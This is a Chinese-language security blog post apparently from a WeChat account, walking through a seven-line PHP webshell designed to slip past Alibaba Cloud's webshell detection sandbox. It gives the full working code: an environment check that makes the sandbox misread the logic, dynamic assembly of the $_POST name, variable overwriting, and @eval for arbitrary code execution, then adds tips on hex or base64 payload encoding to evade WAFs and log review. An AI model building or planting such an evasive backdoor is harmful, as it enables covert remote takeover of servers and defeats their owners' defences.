---
title: 7行代码让你搞定阿里云webshell沙箱
url: https://mp.weixin.qq.com/s/ZVf-4cs9CVQnTbsDiJ7alw
source: Doonsec's feed
date: 2026-04-28
fetch_date: 2026-04-29T05:06:15.550749
---

# 7行代码让你搞定阿里云webshell沙箱

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/KvrEnQiahoiaD0r3shynWeHe6qEe2AUFgUtHVbGw5f4gF5OCB4osfdoKUWpYj0Z7ZzUUknwtjUnf2D0cKIe2PMBUhloIFUzDRJHsxD9gc8ia2g/0?wx_fmt=jpeg)

# 7行代码让你搞定阿里云webshell沙箱

原创

lawliet
lawliet

kingman安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

声明:

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。同时所有相关行为均已取得授权，未经作者同意禁止转载

# 前言

话不多说，开整。

# 第一步

# 这一行就是让阿里云沙箱当场宕机的关键。 不一定非得用 is\_writable，换成判断操作系统类型、判断某个目录存不存在之类的函数一样能用，只要能在真实环境和沙箱里跑出不一样的结果，就能把它搞晕。 想深挖的朋友可以去搜一下“阿里云伏魔对抗”，有更多骚操作。

```
$k = (int)is_writable('index.php');
```

这里本质上就是借助环境差异制造变量，让沙箱猜不透后面的逻辑。真实服务器上，index.php多半存在，不存在就换一个，都不打紧。

而在阿里云的沙箱里，文件系统是虚拟的或者做了限制，返回值和真实环境不一样。这样一来，$k的取值就成了区分沙箱与真实环境的分水岭，后面一切逻辑都围绕这个取值展开，沙箱觉得没毛病，就放过我们了。

# 第二步

# 这一步没什么高深的东西，单纯是为了后面方便从字符串里抠字符，拼出我们想要的 GET 或者 POST。玩过一句话木马的都清楚，最常见的就那个 eval($\_GET['1']);，我们现在要做的就是绕过各种特征检测，把 $\_POST 这种敏感变量名动态拼出来。

```
$name="abcdefghijklmnopqrstuvwxyz~!@#$%^&*()[]_-ABCDEFGHIJKLMNOOPQRSTUVWXYZ'";
```

# 第三步

# 这里 $a 拼出来其实就是 \_POST，但是在沙箱环境里很多条件都不成立，所以会导致沙箱的误判。最关键的地方在 $dict 这个数组：

```
$dict = ['0'=>'2','1'=>'_'];$a=$dict[$k].$name[57].$name[55].$name[60].$name[61];
```

$k 是上面第一步算出来的，沙箱内外取值不同。沙箱里因为没 index.php 或者沙箱自身的限制，is\_writable 多半返回 false，强转成整数就是 0，那么 $dict[$k] 取到的是 '2'，拼出来的 $a 就变成 '2' 加上后面那些字符，结果并不是 \_POST，沙箱自然看不出来你要干嘛。

而真实环境下 $k 极可能为 1（假如 is\_writable 返回 true），于是 $dict[$k] 拿到 '\_'，再跟后面几个字符一拼接，妥妥的就是 \_POST，后面变量覆盖一用，直接接入请求数据。

如果把 $dict 里 0 和 1 的值对调，改成 '0'=>'\_', '1'=>'2'，那在沙箱环境中 $k=0 反而会拼出 \_POST，原本人畜无害的代码瞬间就“可疑”了——沙箱一看，好家伙你这变量覆盖加 eval，还动态拼出了 $\_POST，立马报毒。这就是利用沙箱模拟环境与现实环境的错位来瞒天过海。

# 第四步

# 这一段的 foreach 会把 $$a 解析成 $\_POST（因为上一步 $a 的值是 '\_POST'），然后遍历 POST 数组，把每个键值对都注册成当前作用域里的变量。说白了就是变量覆盖，后面你想传什么参数直接用变量名就能拿到，不用再写 $\_POST['xxx'] 这么明显。

```
foreach($$a as $k=>$v){$$k=$v;}@eval($c);
```

这样一来，你随便在 POST 里传个 c=phpinfo();，经过变量覆盖之后，$c 就有了，再配合 @eval($c)，轻轻松松执行任意代码。整个过程没有显式出现 $\_POST，静态查杀很难从字符串特征上抓到把柄，沙箱也因为在第一步就被绕晕了，根本走不到变量覆盖这一步的正确逻辑，误以为这段代码没有实际危害。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/KvrEnQiahoiaBTCoiblxHPmz2ibekERZ5P3X2tFQmYm3rafWucBWWIZmuHTJUKqkxb09qyFPGH7qmOW2l8ibos1y0soibdibpJE5HfvA1c5nzjAFdk/640?wx_fmt=png&from=appmsg)

# 扩展

# 光这样还不够稳，流量层面也得做做手脚，不然蓝队看日志一眼就能看出你在传什么。可以在 eval 那里套一层编码，比如 eval(hex2bin($c));，传参的时候把 payload 转成十六进制，流量里就看不出原始代码了。类似的还有 base64\_decode、异或、字符串反转等等，花式随你玩，别直接用明文，编码器搞复杂点，waf还是有点东西的。

另外，蚁剑的版本也要记得更新，最近爆出的1Click RCE了解一下，别到时候自己被人反打一波 getshell，反向上线说是。

> https://github.com/AntSwordProject/antSword/releases
>
> 蚁剑地址

就这样，路子已经给了，剩下的自己发挥，eval藏不了，system可以啊

#

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk33j31ajLZ0yloe8cj2zYIaKaL9mGiaX3eEzZ0Y6HH1J15GyY5F0hLZ5GMlILlw81dcxNLoK3hq5cQ/0?wx_fmt=png)

kingman安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/XxjRljYHYk33j31ajLZ0yloe8cj2zYIaKaL9mGiaX3eEzZ0Y6HH1J15GyY5F0hLZ5GMlILlw81dcxNLoK3hq5cQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过